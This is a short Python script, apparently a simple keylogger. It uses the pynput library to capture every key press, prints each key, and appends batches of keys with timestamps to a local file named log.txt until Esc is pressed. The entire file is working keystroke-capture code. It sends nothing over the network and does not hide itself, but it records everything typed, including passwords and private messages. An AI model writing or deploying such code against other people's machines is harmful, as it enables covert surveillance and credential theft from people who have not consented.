from pynput.keyboard import Key, Listener
from datetime import datetime



if __name__ == '__main__':
    
    list_cache  = []
    counter = 0
    
   

    def press(key):
        global list_cache
        global counter
                    
        print(key)

        if counter >= 10:
            send_keys(list_cache)                
            # counter = 0 and list_cache = [] in send_keys() function
        else:
            counter += 1
            list_cache.append(key)
        
    def release(key):
        if key == Key.esc:
            return False
        
    def write_to_file(keys):
        with open('log.txt','a') as file:
            keys = str(keys).replace("'","")
            file.write(keys)
            
    def send_keys(cache_list):
        global list_cache
        global counter
        
        now = datetime.now().strftime("%d-%B-%Y ==> %H:%M:%S")
        write_to_file(f"\n##########\n{now}\n##########\n")
        
        for key in cache_list:
                
                if(key ==  Key.space):
                    write_to_file(" ")
                elif (key == Key.tab):
                    write_to_file("      ")
                elif (key == Key.enter):
                    write_to_file("\n")
                else:
                    write_to_file(key)
        counter = 0
        list_cache = []
            
            


 


    with Listener(
            on_press=press,
            on_release=release) as Listener:
        Listener.join()
    





